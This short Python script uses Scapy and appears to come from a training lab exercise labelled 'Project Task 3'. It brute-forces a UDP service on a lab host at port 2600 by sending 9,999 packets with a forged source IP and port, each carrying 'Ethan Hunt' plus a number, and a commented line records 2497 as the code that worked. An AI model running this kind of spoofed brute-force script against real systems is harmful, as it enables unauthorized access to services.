# Project  Task 3
# Capt Arif Alamri 
# Lt Micah Hayden
# Lt Lucas Mireles

import socket 
import sys
from scapy.all import *
import time
import random

dest_ip = "10.12.1.141"		#mi1.m4i.local use nslookup to find IP
dest_port = 2600		# UDP port 2600
		# has to be 3,33,333,3333, or 33333
source_ip = "10.204.0.79"	# my IP


source_port = 33333

# Brute Force send on Port 33333:

packets = []
for i in range (9999):
	message = "Ethan Hunt {0}".format(i)
	packets.append( IP(dst=dest_ip,src=source_ip)/UDP(dport=dest_port, sport=source_port)/message)
	
send(packets, inter=0)

# Success verification:
#message = "Ethan Hunt 2497"
#packet = IP(dst=dest_ip, src=source_ip)/UDP(dport=dest_port, sport=source_port)/message
#send(packet)
